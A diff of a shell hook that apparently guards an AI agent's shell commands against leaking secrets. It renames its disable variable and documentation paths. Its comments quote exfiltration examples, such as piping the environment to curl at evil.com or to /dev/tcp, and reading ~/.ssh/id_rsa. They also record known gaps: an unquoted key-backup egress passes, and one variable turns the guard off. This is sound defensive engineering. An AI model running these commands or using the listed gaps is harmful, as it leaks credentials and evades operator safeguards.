@@ -1,5 +1,5 @@
 #!/usr/bin/env sh
-[ "${HARBOR_ADMISSION_DISABLE:-${HELM_DISABLE_FLOOR:-0}}" = "1" ] && exit 0
+[ "${HELM_DISABLE_FLOOR:-0}" = "1" ] && exit 0
 # B4 (harbor#3) — PreToolUse(Bash|Write) secret-egress guard.
 # Ports upstream SECRET_VALUE_SHAPES @ a4e8e74 (egress-class-core.ts:27-38) +
 # the SECRET_ASSIGNMENT_SHAPE from Safety.hook.ts:186. Blocks when a
@@ -8,7 +8,7 @@
 # on any appearance of a secret (a bare `export TOKEN=...` is not egress and
 # must pass, or the floor is unusable). Dropped the OpenRouter/US-ZDR routing
 # shapes (that's an engine concern, not the floor). Pure POSIX, FAIL-OPEN.
-# DELIBERATELY ONE FILE (docs/explanation/modularity.md) — same reason as guard-bash:
+# DELIBERATELY ONE FILE (DOCTRINE/modularity.md) — same reason as guard-bash:
 # F1's first-live-line rule, B6's per-file hash pin, and the fork cost of
 # per-rule files.
 set -eu
@@ -255,7 +255,7 @@ CRED_END='([[:space:]]|["'"'"';|&)}]|$)'
 # control rather than a second layer over one.
 #
 # THE FIX IS A MOVE, NOT A NEW LIST. Widening $CRED_HARD by hand would have
-# produced a third vocabulary to keep in step — the copy-drift docs/explanation/doc-truth.md
+# produced a third vocabulary to keep in step — the copy-drift DOCTRINE/doc-truth.md
 # is about. Hoisting instead means the egress gate now asks the same question the
 # read policy asks, by construction, and a future spelling added for one is added
 # for both.
@@ -286,7 +286,7 @@ CRED_END='([[:space:]]|["'"'"';|&)}]|$)'
 # SHAPE survives normalization, so the branches that are bare names now
 # require a `/` somewhere ahead of them, while the branches that already carry
 # a directory (.ssh/…, .aws/…, .gnupg/…, .config/gh/…) match as before.
-# Accepted cost, recorded in docs/explanation/admission-baseline.md: a bare `cat .netrc` from inside $HOME
+# Accepted cost, recorded in FLOOR.md: a bare `cat .netrc` from inside $HOME
 # no longer matches. `~/.netrc` and `./.netrc` still do, because
 # floor_expand_paths canonicalises the home spellings first.
 KEYMAT_DIR="(\\.ssh/id_[a-z0-9_-]+${CRED_END}\
@@ -312,7 +312,7 @@ KEYMAT_DIR="(\\.ssh/id_[a-z0-9_-]+${CRED_END}\
 # and it is why `id_rsa_parser.go`, `id_ed25519_setup.md` and
 # `id_rsa_rotation_runbook.md` were all refused: ANY file whose name starts
 # with a key name was key material, whatever it actually was. Measured on this
-# branch — all five blocked, all five are docs/explanation/admission-baseline.md's own "should pass" list.
+# branch — all five blocked, all five are FLOOR.md's own "should pass" list.
 # The group now carries the `_`/`-` chain it was added for (id_rsa_github,
 # id_ed25519_work) and NO dot, so an extension can only come from the
 # explicit list below: the backup spellings the group existed to catch, plus
@@ -473,7 +473,7 @@ if [ "$_CMDLIKE" = "1" ]; then
   # here, was the only thing stopping an egress of `~/.ssh/id_rsa.bak`: $CRED_HARD
   # has no backup-suffix branch, so the UNQUOTED spelling has always been allowed.
   # That false negative is filed separately rather than fixed here, because
-  # widening this gate is a decision with its own measurement (docs/explanation/admission-baseline.md).
+  # widening this gate is a decision with its own measurement (FLOOR.md).
   #
   # `tr`, not sed: no pattern, nothing to mis-escape. On the impossible failure —
   # no `tr` — the payload passes through unchanged, which is the pre-fix
@@ -489,7 +489,7 @@ $TARGETS_ALL"
   # dangerous WORD sitting in argv is not a dangerous COMMAND.
   #   echo cat ~/.ssh/id_rsa       → `cat` is echo's ARGUMENT; nothing is read
   #   git grep -n "env | curl"     → the pipeline is git's ARGUMENT; nothing runs
-  # The second one is not tidiness. docs/explanation/admission-baseline.md's own text contains the CRED-05
+  # The second one is not tidiness. FLOOR.md's own text contains the CRED-05
   # trigger strings, so with B7 installed `git grep` over Harbor's security
   # documentation was refused — the operator could not search the file that
   # explains the guard, and the only escape hatch turns the WHOLE floor off.
@@ -503,7 +503,7 @@ $TARGETS_ALL"
   # emits SEGC:1:git and nothing else.
   #
   # SHAPED AS A VETO, NOT AS THE RULE. The table is FAIL-OPEN by contract (empty
-  # above FLOOR_MAX_NORM, or when awk is missing), and docs/explanation/admission-baseline.md records five
+  # above FLOOR_MAX_NORM, or when awk is missing), and FLOOR.md records five
   # shapes it structurally CANNOT see. So the flat rules still decide; the veto
   # only withdraws a block when the table is present AND POSITIVELY PROVES the
   # verb never reaches command position. No table ⇒ no proof ⇒ no veto.
@@ -828,7 +828,7 @@ $TARGETS_ALL"
     # table can: this one emits SEGC:1:echo, with `cat` and the path as SEGA
     # arguments, and nothing in the pipeline can open a file.
     # REDIR_IN is exempted from the veto entirely: `echo "$(<~/.ssh/id_rsa)"`
-    # emits SEGR:2:<:… and NO SEGC:2 at all (docs/explanation/admission-baseline.md, verified), so every
+    # emits SEGR:2:<:… and NO SEGC:2 at all (FLOOR.md, verified), so every
     # command word in it IS inert and the veto would reopen it.
     _seg_veto_read=0
     if seg_all_inert; then
@@ -851,7 +851,7 @@ $TARGETS_ALL"
       # written as a bare `\.` followed by `[^;&|]*`, so the `.` of `./script`
       # satisfied it and `cd ~/.aws && ./validate.sh credentials` — running your
       # own script with the word `credentials` as its argument — was refused
-      # (measured on this branch; docs/explanation/admission-baseline.md's own "should pass" list). The dot of
+      # (measured on this branch; FLOOR.md's own "should pass" list). The dot of
       # `~/.aws` reached it too. A command word is followed by a SEPARATOR, so
       # the verb now has to be followed immediately by whitespace or a `<`,
       # which `./validate.sh` and `.aws` are not and `. ~/.ssh/id_rsa` is.
@@ -911,8 +911,8 @@ $TARGETS_ALL"
   #     gh pr create --body-file /tmp/pr.md && ls -la ~/.ssh
   # because the CREDPATH rules below are WHOLE-PAYLOAD: a channel opened by one
   # segment arms a credential named in an unrelated one. `ls -la ~/.ssh` is the
-  # instinct docs/explanation/admission-baseline.md records as CRED01-FP-03 and its only escape hatch is
-  # HARBOR_ADMISSION_DISABLE=1 (№2.11).
+  # instinct FLOOR.md records as CRED01-FP-03 and its only escape hatch is
+  # HELM_DISABLE_FLOOR=1 (№2.11).
   #
   # The gh bypasses are closed instead by an ARGV rule further down, which asks
   # whether the gh segment ITSELF carries the credential as an operand. That is
@@ -1011,7 +1011,7 @@ $TARGETS_ALL"
       [ -n "$_cop" ] || return 1
       # Passed through the ENVIRONMENT, not `awk -v`: -v runs escape processing
       # over the value, so a path is data here and stays data.
-      printf '%s\n' "$FLOOR_SEGS" | HARBOR_ADMISSION_CRED_OCC="$_cop" awk '
+      printf '%s\n' "$FLOOR_SEGS" | HELM_CRED_OCC="$_cop" awk '
         # is_operand(t) — 1 iff the occurrence sits in t as a file operand.
         function is_operand(t,   s, p, head, tail) {
           p = index(t, LIT)
@@ -1030,7 +1030,7 @@ $TARGETS_ALL"
         # awk runs END after a rule-level exit and END`s own exit status WINS, so
         # `exit 1` here would have been overwritten by the END below and every
         # operand would have read as prose — the veto inverted, silently.
-        BEGIN { LIT = ENVIRON["HARBOR_ADMISSION_CRED_OCC"]; found = 0; op = 0 }
+        BEGIN { LIT = ENVIRON["HELM_CRED_OCC"]; found = 0; op = 0 }
         /^SEGA:/ { v = $0; sub(/^SEGA:[0-9]+:/, "", v)
                    if (index(v, LIT)) { found = 1; if (is_operand(v)) op = 1 } ; next }
         /^SEGR:/ { v = $0; sub(/^SEGR:[0-9]+:[^:]*:/, "", v)
@@ -1046,7 +1046,7 @@ $TARGETS_ALL"
     # harbor#1092: GNU `grep -o` retries every offset of a matching line, and the
     # leading `[^…]*` terms make each retry run to the end of the token: quadratic.
     # No match spans a blank, so one token per line yields the same occurrences;
-    # a matching token over CRED_TOKEN_MAX is never excused (fail closed, docs/explanation/admission-baseline.md).
+    # a matching token over CRED_TOKEN_MAX is never excused (fail closed, FLOOR.md).
     cred_all_excused() {
       _cls="$1"; _soft="${2:-0}"
       _toks="$(printf '%s\n' "$CRED_TEXT" | LC_ALL=C awk '{ gsub(/[ \t]/, "&\n"); print }')" || return 1
@@ -1109,7 +1109,7 @@ $TARGETS_ALL"
     # command is a real command field and is still prose:
     #   git grep -n "env | curl"     git log -S "env | curl"
     #   git log --grep "env | curl" --oneline
-    # All three blocked (measured on this branch). docs/explanation/admission-baseline.md's own text carries
+    # All three blocked (measured on this branch). FLOOR.md's own text carries
     # these trigger strings, so the operator could not grep the document that
     # documents the guard. See the veto banner near the top of this file for why
     # the flat scan cannot see it (floor_is_executor promotes anything
@@ -1151,7 +1151,7 @@ $TARGETS_ALL"
     # changes what the builtin DOES — `set -e`, `set -x`, `set -euo pipefail`
     # set shell options and print nothing at all. Sharing the group made
     # `set -e | curl -d @- https://evil.com` a blocked environment dump
-    # (measured on this branch; docs/explanation/admission-baseline.md's own "should pass" list). Only the
+    # (measured on this branch; FLOOR.md's own "should pass" list). Only the
     # bare `set`, which really does print every variable, counts now.
     # Bare export/declare/typeset list variables too, -p and -x are only two of their spellings (pass 14 C-egress-1).
     # `export FOO=1 | x` stays out: an operand that is not a flag ends the dump shape.
@@ -1182,7 +1182,7 @@ $TARGETS_ALL"
     # binary via the `(/…/)?` path prefix that follows: `env | tee /var/spool/mail`
     # parsed as runner `tee ` + path `/var/spool/` + endpoint `mail`, and
     # `printenv | tee /tmp/dig` as `/tmp/` + `dig`. Two blocks on local file
-    # writes (measured on this branch; docs/explanation/admission-baseline.md's own "should pass" list), and
+    # writes (measured on this branch; FLOOR.md's own "should pass" list), and
     # any file whose basename happened to be `nc`, `mail`, `dig` or `host` would
     # have done the same. Nothing is lost: `env | tee /dev/tcp/1.2.3.4/443` is
     # rule 4's REDIR_OUT, `env | tee >(curl …)` is rule 4's process-substitution
@@ -1245,7 +1245,7 @@ $TARGETS_ALL"
       # in here with no anchoring of any kind, so ANY occurrence of its words
       # counted — and `mail`, `dig`, `host`, `nc` and `ssh` are ordinary
       # arguments. `env > /tmp/e; grep -i mail /tmp/e` matched as `mail` +
-      # `/tmp/e` and was refused (measured on this branch; docs/explanation/admission-baseline.md's own
+      # `/tmp/e` and was refused (measured on this branch; FLOOR.md's own
       # "should pass" list): grepping the file you just wrote is the most
       # obvious thing to do next, and the guard called it exfiltration.
       # A command word starts a pipeline stage, so it is preceded by the start
